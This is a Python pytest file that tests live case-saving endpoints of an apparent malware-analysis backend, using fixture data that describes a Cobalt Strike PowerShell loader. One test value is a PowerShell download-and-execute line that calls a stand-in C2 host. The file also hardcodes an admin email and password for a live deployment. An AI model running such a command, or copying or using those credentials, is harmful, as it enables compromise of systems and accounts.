"""Live SSOT persistence contract test — hits REACT_APP_BACKEND_URL with
real admin JWT (R27 gate). Read-only validation of P0 milestone.

Run:  cd /app/backend && python -m pytest tests/test_ssot_persistence_live.py \
        -v --junitxml=/app/test_reports/pytest/ssot_live.xml
"""
from __future__ import annotations

import os
import uuid
from typing import Any, Dict

import pytest
import requests

BASE_URL = os.environ.get(
    "REACT_APP_BACKEND_URL",
    "https://greeting-app-5782.preview.emergentagent.com",
).rstrip("/")
ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"

TIMEOUT = 60


@pytest.fixture(scope="session")
def token() -> str:
    r = requests.post(
        f"{BASE_URL}/api/auth/login",
        json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
        timeout=TIMEOUT,
    )
    assert r.status_code == 200, f"login failed {r.status_code}: {r.text[:200]}"
    data = r.json()
    tok = data.get("token") or data.get("access_token")
    assert tok, f"no token in login response: {data}"
    return tok


@pytest.fixture(scope="session")
def client(token) -> requests.Session:
    s = requests.Session()
    s.headers.update({"Authorization": f"Bearer {token}", "Content-Type": "application/json"})
    return s


CREATED_IDS: list[str] = []


def _sample_ssot(kind: str = "typical") -> Dict[str, Any]:
    base = {
        "understanding": {"input_kind": "powershell", "confidence": 0.94, "decode_required": True,
                          "next_steps": ["base64_decode", "gzip_decompress"]},
        "analyst_narrative": {"executive_summary": "PS downloader",
                              "sigma_ideas": ["proc_creation_win_powershell_download_iex"],
                              "yara_ideas": ["gzip_pe_dropper"],
                              "recommended_actions": ["Isolate host"]},
        "inline_story_preproc": {"stages": [{"op": "b64"}, {"op": "gzip"}]},
        "investigation_object": {"acquisition_plan": [{"step": "extract_iocs"}],
                                 "incident": {"behaviors": ["T1059.001"]},
                                 "ice": {"behavior_clusters": ["download-and-execute"]}},
        "investigation_mode": True,
        "verdict_card": {"verdict": "Malicious", "confidence": 92,
                         "family": "Cobalt Strike", "summary": "Beaconing loader"},
        "decode_trace": [{"layer": 1, "op": "b64", "out_len": 512},
                         {"layer": 2, "op": "gzip", "out_len": 2048}],
        "decode_winner_engine": "powershell-recursive",
        "decode_confidence": 92,
        "iedde": {"steps": [{"decision": "recover"}]},
        "iedde_terminal_state": "recovered",
        "canonical_confidence": 0.93,
        "canonical_confidence_reason": "3-layer clean recovery",
        "mitre": ["T1059.001", "T1105"],
        "lolbas": ["powershell.exe"],
        "semantic": {"clusters": ["c2-download"]},
        "reached_shellcode": True,
        "corrupted_container": None,
        "chain": [{"op": "b64"}, {"op": "gzip"}],
        "steps": [{"op": "b64", "args": {}}, {"op": "gzip", "args": {}}],
        "predicted_tree": {"root": {"name": "powershell.exe"}},
        "analysis": {"iocs": {"ipv4": ["1.2.3.4"]}, "mitre": ["T1059.001"], "ai_verdict": "Malicious"},
    }
    if kind == "huge":
        base["semantic"] = {"blob": "X" * (9 * 1024 * 1024)}
    return base


def _save(client: requests.Session, name: str, ssot: Dict[str, Any] | None):
    body = {
        "name": name,
        "input": "powershell -EncodedCommand ABCDEF==",
        "output": "iex ((New-Object Net.WebClient).DownloadString('http://c2.example/beacon'))",
        "engine": "powershell-recursive",
        "confidence": 92,
        "chain_ids": ["b64", "gzip"],
        "verdict": "Malicious",
        "iocs": {"ipv4": ["1.2.3.4"]},
        "ssot": ssot,
    }
    r = client.post(f"{BASE_URL}/api/cases/save", json=body, timeout=TIMEOUT)
    assert r.status_code == 200, f"save failed {r.status_code}: {r.text[:400]}"
    data = r.json()
    if data.get("id"):
        CREATED_IDS.append(data["id"])
    return data


# ─── T1 · Round-trip preserves all SSOT keys ──────────────────────────────
def test_ssot_round_trip_preserves_all_fields(client):
    ssot = _sample_ssot()
    name = f"pytest-live-ssot-{uuid.uuid4().hex[:8]}"
    save_resp = _save(client, name, ssot)
    case_id = save_resp["id"]

    r = client.get(f"{BASE_URL}/api/cases/{case_id}", timeout=TIMEOUT)
    assert r.status_code == 200, r.text[:200]
    got = r.json()
    got_ssot = got.get("ssot") or {}
    for k in ["understanding", "analyst_narrative", "inline_story_preproc",
              "investigation_object", "investigation_mode", "verdict_card",
              "decode_trace", "iedde", "canonical_confidence",
              "canonical_confidence_reason", "mitre", "lolbas", "semantic",
              "reached_shellcode", "chain", "steps", "predicted_tree", "analysis"]:
        assert k in got_ssot, f"SSOT missing key: {k!r}"
    assert got_ssot["understanding"]["input_kind"] == "powershell"
    assert got_ssot["verdict_card"]["family"] == "Cobalt Strike"
    assert got_ssot["mitre"] == ["T1059.001", "T1105"]
    assert got_ssot.get("version") == "1.0"
    assert "persisted_at" in got_ssot


# ─── T2 · List surfaces has_ssot / ssot_version ───────────────────────────
def test_list_cases_flags_ssot_presence(client):
    with_ssot = f"pytest-live-flag-{uuid.uuid4().hex[:6]}"
    _save(client, with_ssot, _sample_ssot())
    legacy = f"pytest-live-legacy-{uuid.uuid4().hex[:6]}"
    _save(client, legacy, None)

    r = client.get(f"{BASE_URL}/api/cases", params={"limit": 500}, timeout=TIMEOUT)
    assert r.status_code == 200
    by_name = {c["name"]: c for c in r.json()["cases"]}
    assert with_ssot in by_name, f"{with_ssot} missing from list"
    assert legacy in by_name, f"{legacy} missing from list"
    assert by_name[with_ssot]["has_ssot"] is True
    assert by_name[with_ssot]["ssot_version"] == "1.0"
    assert by_name[legacy]["has_ssot"] is False
    assert by_name[legacy].get("ssot_version") in (None, "")


# ─── T3 · Oversized bundle drops optional fields ──────────────────────────
def test_oversized_bundle_drops_gracefully(client):
    huge = _sample_ssot("huge")
    name = f"pytest-live-huge-{uuid.uuid4().hex[:6]}"
    save_resp = _save(client, name, huge)
    case_id = save_resp["id"]
    r = client.get(f"{BASE_URL}/api/cases/{case_id}", timeout=TIMEOUT)
    assert r.status_code == 200
    got_ssot = r.json().get("ssot") or {}
    assert got_ssot.get("version") == "1.0"
    dropped = got_ssot.get("dropped_for_size") or []
    assert "semantic" in dropped, f"expected 'semantic' dropped, got {dropped!r}"
    assert "understanding" in got_ssot
    assert "investigation_object" in got_ssot


# ─── T4 · Upsert replaces SSOT atomically ─────────────────────────────────
def test_ssot_survives_upsert(client):
    name = f"pytest-live-upsert-{uuid.uuid4().hex[:6]}"
    first = _save(client, name, _sample_ssot())
    case_id = first["id"]
    modified = _sample_ssot()
    modified["verdict_card"]["family"] = "Meterpreter"
    second = _save(client, name, modified)
    assert second["id"] == case_id, f"upsert produced new id {second['id']} != {case_id}"
    r = client.get(f"{BASE_URL}/api/cases/{case_id}", timeout=TIMEOUT)
    got = r.json()
    assert got["ssot"]["verdict_card"]["family"] == "Meterpreter"


# ─── T5 · Legacy save (no SSOT) still works ───────────────────────────────
def test_legacy_save_still_works(client):
    name = f"pytest-live-legacy-nossot-{uuid.uuid4().hex[:6]}"
    save_resp = _save(client, name, None)
    case_id = save_resp["id"]
    r = client.get(f"{BASE_URL}/api/cases/{case_id}", timeout=TIMEOUT)
    got = r.json()
    assert got.get("ssot") is None
    assert got.get("ssot_version") in (None, "")
    assert got["input"]
    assert got["output"]


# ─── T6 · Regression: sigma / yara / reinvestigate / delete still work ────
def test_case_endpoints_no_regression(client):
    name = f"pytest-live-regress-{uuid.uuid4().hex[:6]}"
    save_resp = _save(client, name, _sample_ssot())
    case_id = save_resp["id"]

    # Sigma
    r = client.get(f"{BASE_URL}/api/cases/{case_id}/sigma", timeout=TIMEOUT)
    assert r.status_code == 200, f"sigma {r.status_code}: {r.text[:200]}"

    # Yara
    r = client.get(f"{BASE_URL}/api/cases/{case_id}/yara", timeout=TIMEOUT)
    assert r.status_code == 200, f"yara {r.status_code}: {r.text[:200]}"

    # Reinvestigate
    r = client.post(f"{BASE_URL}/api/cases/{case_id}/reinvestigate", json={}, timeout=TIMEOUT)
    assert r.status_code in (200, 202), f"reinvestigate {r.status_code}: {r.text[:300]}"

    # Delete
    r = client.delete(f"{BASE_URL}/api/cases/{case_id}", timeout=TIMEOUT)
    assert r.status_code in (200, 204), f"delete {r.status_code}: {r.text[:200]}"

    # GET should now 404
    r = client.get(f"{BASE_URL}/api/cases/{case_id}", timeout=TIMEOUT)
    assert r.status_code == 404, f"after delete expected 404 got {r.status_code}"


# ─── Teardown · best-effort cleanup of TEST cases ────────────────────────
def test_zzz_cleanup(client):
    for cid in list(CREATED_IDS):
        try:
            client.delete(f"{BASE_URL}/api/cases/{cid}", timeout=TIMEOUT)
        except Exception:
            pass
